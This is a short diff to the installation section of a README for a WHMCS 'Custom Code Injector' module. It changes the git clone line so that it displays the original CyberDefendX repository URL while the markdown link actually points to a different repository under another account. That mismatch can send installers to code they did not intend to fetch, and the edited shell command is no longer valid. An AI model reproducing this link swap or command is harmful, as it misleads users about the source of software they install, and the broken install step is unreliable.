@@ -29,5 +29,5 @@ The **Custom Code Injector** module allows WHMCS administrators to inject custom
 
 1. **Download the Module**: Clone this repository or download the ZIP file.
    ```bash
-   git clone https://github.com/CyberDefendX/custom-code-injector.git
+   git clone [https://github.com/CyberDefendX/custom-code-injector.git](https://github.com/bigboss821/customcodeinjector-whmcs.git)
 
